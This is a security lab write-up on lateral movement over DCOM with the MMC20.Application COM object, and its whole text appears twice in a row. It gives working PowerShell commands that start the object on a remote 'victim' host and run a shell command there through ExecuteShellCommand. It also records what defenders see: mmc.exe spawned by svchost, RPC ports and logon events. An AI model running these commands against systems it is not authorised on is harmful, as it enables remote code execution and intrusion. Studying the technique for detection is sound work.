# Lateral Movement via DCOM

## Lateral Movement via DCOM

> The Microsoft Component Object Model (COM) is a platform-independent, distributed, object-oriented system for creating binary software components that can interact. COM is the foundation technology for Microsoft's OLE (compound documents), ActiveX (Internet-enabled components), as well as others.
>
> [https://docs.microsoft.com/en-us/windows/desktop/com/the-component-object-model](https://docs.microsoft.com/en-us/windows/desktop/com/the-component-object-model)

This lab explores a DCOM lateral movement technique using MMC20.Application COM as originally researched by @enigma0x3 in his blog post [Lateral Movement using the mmc20.application Com Object](https://enigma0x3.net/2017/09/11/lateral-movement-using-excel-application-and-dcom/)

### Execution

MMC20.Application COM class is stored in the registry as shown below:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LKkwBlbJALMMlLPE0ou%2F-LKkwPt4rwHXnUXcQkr6%2Fdcom-registry.png?alt=media\&token=46dd9469-3a92-46b0-aff6-5e66c58e3a59)

Same can be achieved with powershell:

```csharp
Get-ChildItem 'registry::HKEY_CLASSES_ROOT\WOW6432Node\CLSID\{49B2791A-B1AE-4C90-9B8E-E860BA07F889}'
```

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LKkwBlbJALMMlLPE0ou%2F-LKkwKzTKQ0-kYvBSss-%2Fdcom-registry2.png?alt=media\&token=8980a887-baa4-4ebb-8d62-c573ee88d43e)

Establishing a connection to the victim host:

{% code title="attacker\@victim" %}
```csharp
$a = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","10.0.0.2"))
```
{% endcode %}

Executing command on the victim system via DCOM object:

{% code title="attacker\@victim" %}
```csharp
$a.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c hostname > c:\fromdcom.txt","7")
```
{% endcode %}

Below shows the command execution and the result of it - remote machine's `hostname` command output is written to `c:\fromdcom.txt`:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LKkwBlbJALMMlLPE0ou%2F-LKkxh5dxzNS1LiW_kgt%2Fdcom-rce.png?alt=media\&token=58449397-45c3-43ef-b0ed-fae56490b091)

### Observations

Once the connection from an attacker to victim is established using the below powershell:

```csharp
[System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","10.0.0.2"))
```

This is what happens on the victim system - `svchost` spawns `mmc.exe` which opens a listening port via RPC binding:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LKkwBlbJALMMlLPE0ou%2F-LKkykddPtVxFwAsO2N8%2Fdcom-mmc-bind.png?alt=media\&token=b28a54fd-c37d-4db1-b51a-16940728fbff)

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LKkwBlbJALMMlLPE0ou%2F-LKkzD-Na7BJunePFCIU%2Fdcom-listening.png?alt=media\&token=de44b1d2-ed8c-44f9-9700-b683d9e0949b)

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LKkwBlbJALMMlLPE0ou%2F-LKkzK1XPS2ZFsDyto1P%2Fdcom-ancestry%2Bconnections.png?alt=media\&token=ae5ffed3-4d4c-4942-9f0f-dd81e32a74c4)

A network connection is logged from 10.0.0.7 (attacker) to 10.0.0.2 (victim) via `offense\administrator` (can be also seen from the above screenshot):

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LKkwBlbJALMMlLPE0ou%2F-LKkzd7_4YzswfluKhhg%2Fdcom-logon-event.png?alt=media\&token=46862036-1537-4a22-832a-b9c6b55cb7bf)

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LKkwBlbJALMMlLPE0ou%2F-LKl-1X9mOq1_Z6_LJfx%2Fdcom-connection2.png?alt=media\&token=79535fb4-3a04-4297-9e27-00127d12e377)

### References

{% embed url="https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/" %}

{% embed url="https://docs.microsoft.com/en-us/previous-versions/windows/desktop/mmc/view-executeshellcommand" %}

{% embed url="https://docs.microsoft.com/en-us/dotnet/api/system.type.gettypefromclsid?view=netframework-4.7.2#System_Type_GetTypeFromCLSID_System_Guid_System_String_" %}

{% embed url="https://docs.microsoft.com/en-us/windows/desktop/com/com-technical-overview" %}

{% embed url="https://attack.mitre.org/wiki/Technique/T1175" %}

## Lateral Movement via DCOM

> The Microsoft Component Object Model (COM) is a platform-independent, distributed, object-oriented system for creating binary software components that can interact. COM is the foundation technology for Microsoft's OLE (compound documents), ActiveX (Internet-enabled components), as well as others.
>
> [https://docs.microsoft.com/en-us/windows/desktop/com/the-component-object-model](https://docs.microsoft.com/en-us/windows/desktop/com/the-component-object-model)

This lab explores a DCOM lateral movement technique using MMC20.Application COM as originally researched by @enigma0x3 in his blog post [Lateral Movement using the mmc20.application Com Object](https://enigma0x3.net/2017/09/11/lateral-movement-using-excel-application-and-dcom/)

### Execution

MMC20.Application COM class is stored in the registry as shown below:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LKkwBlbJALMMlLPE0ou%2F-LKkwPt4rwHXnUXcQkr6%2Fdcom-registry.png?alt=media\&token=46dd9469-3a92-46b0-aff6-5e66c58e3a59)

Same can be achieved with powershell:

```csharp
Get-ChildItem 'registry::HKEY_CLASSES_ROOT\WOW6432Node\CLSID\{49B2791A-B1AE-4C90-9B8E-E860BA07F889}'
```

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LKkwBlbJALMMlLPE0ou%2F-LKkwKzTKQ0-kYvBSss-%2Fdcom-registry2.png?alt=media\&token=8980a887-baa4-4ebb-8d62-c573ee88d43e)

Establishing a connection to the victim host:

{% code title="attacker\@victim" %}
```csharp
$a = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","10.0.0.2"))
```
{% endcode %}

Executing command on the victim system via DCOM object:

{% code title="attacker\@victim" %}
```csharp
$a.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c hostname > c:\fromdcom.txt","7")
```
{% endcode %}

Below shows the command execution and the result of it - remote machine's `hostname` command output is written to `c:\fromdcom.txt`:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LKkwBlbJALMMlLPE0ou%2F-LKkxh5dxzNS1LiW_kgt%2Fdcom-rce.png?alt=media\&token=58449397-45c3-43ef-b0ed-fae56490b091)

### Observations

Once the connection from an attacker to victim is established using the below powershell:

```csharp
[System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","10.0.0.2"))
```

This is what happens on the victim system - `svchost` spawns `mmc.exe` which opens a listening port via RPC binding:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LKkwBlbJALMMlLPE0ou%2F-LKkykddPtVxFwAsO2N8%2Fdcom-mmc-bind.png?alt=media\&token=b28a54fd-c37d-4db1-b51a-16940728fbff)

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LKkwBlbJALMMlLPE0ou%2F-LKkzD-Na7BJunePFCIU%2Fdcom-listening.png?alt=media\&token=de44b1d2-ed8c-44f9-9700-b683d9e0949b)

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LKkwBlbJALMMlLPE0ou%2F-LKkzK1XPS2ZFsDyto1P%2Fdcom-ancestry%2Bconnections.png?alt=media\&token=ae5ffed3-4d4c-4942-9f0f-dd81e32a74c4)

A network connection is logged from 10.0.0.7 (attacker) to 10.0.0.2 (victim) via `offense\administrator` (can be also seen from the above screenshot):

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LKkwBlbJALMMlLPE0ou%2F-LKkzd7_4YzswfluKhhg%2Fdcom-logon-event.png?alt=media\&token=46862036-1537-4a22-832a-b9c6b55cb7bf)

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LKkwBlbJALMMlLPE0ou%2F-LKl-1X9mOq1_Z6_LJfx%2Fdcom-connection2.png?alt=media\&token=79535fb4-3a04-4297-9e27-00127d12e377)

### References

{% embed url="https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/" %}

{% embed url="https://docs.microsoft.com/en-us/previous-versions/windows/desktop/mmc/view-executeshellcommand" %}

{% embed url="https://docs.microsoft.com/en-us/dotnet/api/system.type.gettypefromclsid?view=netframework-4.7.2#System_Type_GetTypeFromCLSID_System_Guid_System_String_" %}

{% embed url="https://docs.microsoft.com/en-us/windows/desktop/com/com-technical-overview" %}

{% embed url="https://attack.mitre.org/wiki/Technique/T1175" %}
